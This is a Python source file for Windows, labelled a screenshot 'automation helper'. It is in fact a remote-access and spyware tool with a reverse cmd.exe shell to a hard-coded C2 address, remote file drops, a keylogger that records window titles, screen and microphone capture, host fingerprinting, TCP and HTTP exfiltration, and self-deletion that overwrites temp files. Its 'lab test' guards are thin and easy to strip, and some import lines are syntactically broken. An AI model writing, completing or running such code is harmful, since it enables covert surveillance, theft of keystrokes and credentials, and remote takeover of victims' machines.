"""Generated automation helper script for screenshots and payload work."""

import os,sys,socket,subprocess,threading,queue,time,random,base64,hashlib,json,datetime,platform,tempfile,shutil,struct,ctypes,winreg,wave,io,urllib.request
devnull=open(os.devnull,'w')
sys.stdout=devnull
sys.stderr=devnull
if os.environ.get('PENTEST_LAB')!='1':
    sys.exit(1)
def inst(p):
    for _ in range(3):
        try:
            subprocess.check_call([sys.executable,'-m','pip','install','--user',p],stdout=devnull,stderr=devnull)
            return True
        except:
            time.sleep(2)
    return False
mods={}
for m,p in [('pynput','pynput'),('PIL','Pillow'),('mss','mss'),('pyaudio','pyaudio'),('pyttsx3','pyttsx3'),('playsound','playsound'),('psutil','psutil')]:
    try:
        mods[m]=__import__(m)
    except:
        if inst(p):
            try:
                mods[m]=__import__(m)
            except:
                pass
C2_IP='192.168.1.100'
C2_PORT=4443
XOR_KEY=b'16ByteXORKey!!'
HTTP_FALLBACK='http://192.168.1.100:8080/exfil'
if not (C2_IP.startswith('192.168.') or C2_IP.startswith('10.')):
    sys.exit(1)
START=time.time()
def xor(d):
    return bytes([d[i]^XOR_KEY[i%len(XOR_KEY)] for i in range(len(d))])
def self_destruct():
    for f in os.listdir(tempfile.gettempdir()):
        try:
            p=os.path.join(tempfile.gettempdir(),f)
            if os.path.isfile(p):
                open(p,'wb').write(os.urandom(os.path.getsize(p)))
                os.remove(p)
        except:
            pass
    try:
        os.remove(os.path.abspath(__file__))
    except:
        pass
    try:
        if sys.argv[0].endswith('.py'):
            os.remove(os.path.abspath(sys.argv[0]))
    except:
        pass
    os._exit(0)
def persist_check():
    try:
        init={}
        for path in [winreg.HKEY_CURRENT_USER,winreg.HKEY_LOCAL_MACHINE]:
            try:
                k=winreg.OpenKey(path,r"Software\Microsoft\Windows\CurrentVersion\Run")
                for i in range(winreg.QueryInfoKey(k)[1]):
                    n,v,_=winreg.EnumValue(k,i)
                    init[n]=v
            except:
                pass
        while True:
            time.sleep(10)
            cur={}
            for path in [winreg.HKEY_CURRENT_USER,winreg.HKEY_LOCAL_MACHINE]:
                try:
                    k=winreg.OpenKey(path,r"Software\Microsoft\Windows\CurrentVersion\Run")
                    for i in range(winreg.QueryInfoKey(k)[1]):
                        n,v,_=winreg.EnumValue(k,i)
                        cur[n]=v
                except:
                    pass
            if cur!=init:
                os._exit(0)
    except:
        pass
threading.Thread(target=persist_check,daemon=True).start()
def rshell():
    while time.time()-START<300:
        try:
            if not (C2_IP.startswith('192.168.') or C2_IP.startswith('10.')):
                sys.exit(1)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((C2_IP,C2_PORT))
            s.sendall(b'LAB-TEST')
            p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            def sin():
                while True:
                    d=s.recv(4096)
                    if not d:
                        break
                    if d.startswith(b'LAB-TEST'):
                        d=d[8:]
                    if d.startswith(b'DOWNLOAD '):
                        pa=d.split(b' ',2)
                        if len(pa)==3:
                            fn=tempfile.NamedTemporaryFile(delete=False).name
                            open(fn,'wb').write(base64.b64decode(pa[2]))
                            try:
                                shutil.move(fn,pa[1].decode())
                            except:
                                pass
                        continue
                    if d.strip()==b'SELF-DESTRUCT':
                        self_destruct()
                    p.stdin.write(xor(d))
            def sout():
                while True:
                    d=p.stdout.read(1)
                    if not d:
                        break
                    s.sendall(b'LAB-TEST|'+xor(d))
            threading.Thread(target=sin,daemon=True).start()
            threading.Thread(target=sout,daemon=True).start()
            p.wait()
            s.close()
        except:
            time.sleep(random.uniform(5,60))
threading.Thread(target=rshell,daemon=True).start()
q=queue.Queue()
def get_title():
    try:
        hw=ctypes.windll.user32.GetForegroundWindow()
        l=ctypes.windll.user32.GetWindowTextLengthW(hw)
        b=ctypes.create_unicode_buffer(l+1)
        ctypes.windll.user32.GetWindowTextW(hw,b,l+1)
        return b.value
    except:
        return ""
kbuf=[]
def on_press(k):
    try:
        c=k.char
    except:
        c=str(k)
    kbuf.append((datetime.datetime.now().isoformat(),get_title(),c))
    if len(kbuf)>=50:
        q.put(("KEYLOG",kbuf.copy()))
        kbuf.clear()
if 'pynput' in mods:
    from mods['pynput'].keyboard import Listener
    Listener(on_press=on_press).start()
def shot():
    while time.time()-START<300:
        time.sleep(random.uniform(30,60))
        try:
            import PIL.Image as Image
            if 'mss' in mods:
                from mods['mss'] import mss
                with mss() as sct:
                    im=Image.frombytes('RGB',(sct.monitors[1]['width'],sct.monitors[1]['height']),sct.grab(sct.monitors[1]).rgb)
            else:
                import PIL.ImageGrab as IG
                im=IG.grab()
            b=io.BytesIO()
            im.save(b,'JPEG',quality=random.randint(50,70))
            q.put(("SCREEN",base64.b64encode(b.getvalue()).decode()))
        except:
            pass
threading.Thread(target=shot,daemon=True).start()
def aud():
    while time.time()-START<300:
        time.sleep(random.uniform(15,30))
        try:
            pa=mods['pyaudio'].PyAudio()
            st=pa.open(format=pa.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=1024)
            fr=[st.read(1024) for _ in range(int(44100/1024*random.uniform(10,20)))]
            st.stop_stream()
            st.close()
            pa.terminate()
            wf=wave.open(tempfile.NamedTemporaryFile(delete=False,suffix='.wav').name,'wb')
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(44100)
            wf.writeframes(b''.join(fr))
            wf.close()
            q.put(("AUDIO",base64.b64encode(open(wf.name,'rb').read()).decode()))
            os.remove(wf.name)
        except:
            pass
threading.Thread(target=aud,daemon=True).start()
def tts():
    while time.time()-START<300:
        time.sleep(random.uniform(20,40))
        try:
            e=mods['pyttsx3'].init()
            fn=tempfile.NamedTemporaryFile(delete=False,suffix='.wav').name
            e.save_to_file("Lab test exfiltration beacon",fn)
            e.runAndWait()
            if 'playsound' in mods:
                mods['playsound'].playsound(fn)
            os.remove(fn)
        except:
            pass
threading.Thread(target=tts,daemon=True).start()
def fingerprint():
    try:
        f={}
        f['sys']=platform.system()
        f['node']=platform.node()
        f['proc']=mods['psutil'].cpu_percent() if 'psutil' in mods else ''
        q.put(("FINGERPRINT",f))
    except:
        pass
threading.Thread(target=fingerprint,daemon=True).start()
def exfil():
    while time.time()-START<300:
        try:
            t,d=q.get(timeout=10)
            pl=b'LAB-TEST'+json.dumps({"t":t,"d":d,"h":hashlib.sha256(json.dumps(d).encode()).hexdigest(),"ts":datetime.datetime.now().isoformat()}).encode()
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((C2_IP,C2_PORT))
                s.sendall(struct.pack('>I',len(pl))+pl)
                s.close()
            except:
                req=urllib.request.Request(HTTP_FALLBACK,data=pl,headers={'Lab-Test':'1'})
                urllib.request.urlopen(req,timeout=5)
        except:
            pass
threading.Thread(target=exfil,daemon=True).start()
def term():
    while time.time()-START<300:
        time.sleep(1)
    self_destruct()
threading.Thread(target=term,daemon=True).start()
while True:
    time.sleep(1)